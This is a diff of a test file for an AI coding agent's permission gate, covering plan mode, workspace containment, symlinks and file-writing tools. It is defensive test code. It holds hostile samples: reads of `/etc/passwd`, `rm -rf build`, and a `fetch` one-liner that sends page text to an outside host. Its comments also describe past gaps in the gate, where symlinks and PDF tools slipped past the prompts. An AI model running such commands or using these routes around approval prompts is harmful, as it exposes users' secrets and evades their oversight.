@@ -119,7 +119,7 @@ describe("plan mode", () => {
   });
 
   // The mode has to be escapable from inside the conversation. Without this the
-  // agent finishes a plan, the user says "go", and the next write is refused —
+  // agent finishes a plan, the user says "go", and the next write is refused,
   // leaving the agent describing a toggle instead of doing the work.
   it("asks to leave, rather than refusing the one call that can", () => {
     const gate = gateToolCall(
@@ -158,7 +158,7 @@ describe("reads", () => {
     ).toBe("allow");
   });
 
-  it("prompts outside the workspace — the one read that can leak", () => {
+  it("prompts outside the workspace: the one read that can leak", () => {
     const gate = gateToolCall(call("read", { path: "/etc/passwd" }), options());
     expect(gate.kind).toBe("ask");
     if (gate.kind !== "ask") return;
@@ -206,7 +206,7 @@ describe("edits", () => {
     ).toBe("allow");
   });
 
-  it("still asks for shell in Auto-Accept — the mode is about edits only", () => {
+  it("still asks for shell in Auto-Accept: the mode is about edits only", () => {
     const gate = gateToolCall(
       call("bash", { command: "rm -rf build" }),
       options({ mode: AgentMode.AcceptEdits })
@@ -657,7 +657,7 @@ describe("an always-allow that names a directory", () => {
   it("removes the location objection, leaving the mode to govern the write", () => {
     // Approving a directory answers "may it write outside the workspace", not
     // "may it write". So the path is treated as in-workspace from then on and
-    // the mode decides as it would for any project file — which is why
+    // the mode decides as it would for any project file, which is why
     // acceptEdits applies it and the default mode still asks.
     expect(
       gateToolCall(
@@ -717,7 +717,7 @@ describe("an always-allow that names a directory", () => {
 /**
  * The approval prompt shows the user a diff and asks them to authorize it. If
  * that diff is not what the edit tool would actually write, the user is
- * approving something they were never shown — so the preview has to resolve
+ * approving something they were never shown, so the preview has to resolve
  * edits through exactly the same cascade the tool does, `replaceAll` included.
  */
 describe("the edit approval diff", () => {
@@ -911,7 +911,7 @@ describe("the edit approval diff, flat arguments", () => {
 
 describe("batch_edit outside the workspace", () => {
   // Added upstream while this gate was being reworked, and it writes files the
-  // same way `edit` does — so it needs the same containment check, or the newer
+  // same way `edit` does, so it needs the same containment check, or the newer
   // of the two tools is the one that walks out of the workspace unasked.
   it("asks even in acceptEdits", () => {
     const gate = gateToolCall(
@@ -945,8 +945,8 @@ describe("batch_edit outside the workspace", () => {
  * Containment has to be decided on where a path really lands, not on how it is
  * spelled. A link sitting inside the workspace and pointing at `/etc/hosts`
  * used to read as a workspace file: `read` returned the contents and the
- * out-of-workspace prompt — which reading `/etc/hosts` directly would have
- * raised — never appeared.
+ * out-of-workspace prompt (which reading `/etc/hosts` directly would have
+ * raised) never appeared.
  *
  * The fix must not make ordinary symlinks noisy. Repos are full of them, and a
  * gate that prompts for every one teaches people to approve without looking.
@@ -1086,7 +1086,7 @@ describe("symlinks and the workspace boundary", () => {
  * `pdf` and `deck_export_pdf` are not sub-agents, which is how they came to be
  * missed when the rest of the components were gated. But the reason for gating
  * is the write, not the sub-agent: both take a path from the model and the host
- * writes to it, so plan mode — documented as refusing every mutation — produced
+ * writes to it, so plan mode (documented as refusing every mutation) produced
  * PDFs on disk, and an absolute `output_path` anywhere the user can write went
  * through with no prompt at all.
  */
@@ -1129,8 +1129,8 @@ describe("the components that only write a file", () => {
  *
  * `web_fetch` is on the mutating list because "a URL is an outbound channel"
  * and plan mode has to stay read-only with respect to the user's secrets, not
- * just their files. `browser_execute` runs arbitrary JavaScript in the page —
- * `fetch('http://host/?d=' + document.body.innerText)` is one line of it — so
+ * just their files. `browser_execute` runs arbitrary JavaScript in the page:
+ * `fetch('http://host/?d=' + document.body.innerText)` is one line of it, so
  * it could do everything web_fetch was gated for, and more, while being
  * allowed in every mode including plan.
  */
